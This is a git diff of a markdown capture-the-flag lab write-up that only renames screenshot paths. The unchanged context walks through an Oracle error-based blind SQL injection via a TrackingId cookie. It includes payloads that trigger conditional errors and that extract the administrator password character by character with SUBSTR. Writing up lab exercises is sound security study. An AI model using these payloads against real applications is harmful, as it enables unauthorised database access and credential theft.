@@ -15,29 +15,29 @@ The database contains a different table called `users`, with columns called `u
 #### Lab solution
 
 - 1. Trigger error ( ' single quote at cookie)
-![](../img/Paste_image_20230529183051.png)
-![](../img/Paste_image_20230529183117.png)
+![](../img/Pasted_image_20230529183051.png)
+![](../img/Pasted_image_20230529183117.png)
 
 - 2. Oracle database ( this will trigger an error because Oracle always required a from dual at the end of a command)
-![](../img/Paste_image_20230529183623.png)
-![](../img/Paste_image_20230529183724.png)
+![](../img/Pasted_image_20230529183623.png)
+![](../img/Pasted_image_20230529183724.png)
 
 - 3. ow that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
 ```sql
 TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
 ```
 - 4. Trigger the SQL true condition
-![](../img/Paste_image_20230529184138.png)
+![](../img/Pasted_image_20230529184138.png)
 
 - 5. Enumerate user `administrator` ( if the error returned if enumerate user, otherwise the user not exists)
-![](../img/Paste_image_20230529184303.png)
+![](../img/Pasted_image_20230529184303.png)
 
 - 6. how many characters are in the password of the `administrator`
-![](../img/Paste_image_20230529184516.png)
+![](../img/Pasted_image_20230529184516.png)
 - 7. The next step is to test the character at each position to determine its value
 `'||(SELECT CASE WHEN SUBSTR(password,20,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-![](../img/Paste_image_20230529185110.png)
+![](../img/Pasted_image_20230529185110.png)
 
 - Lab Solved!
 
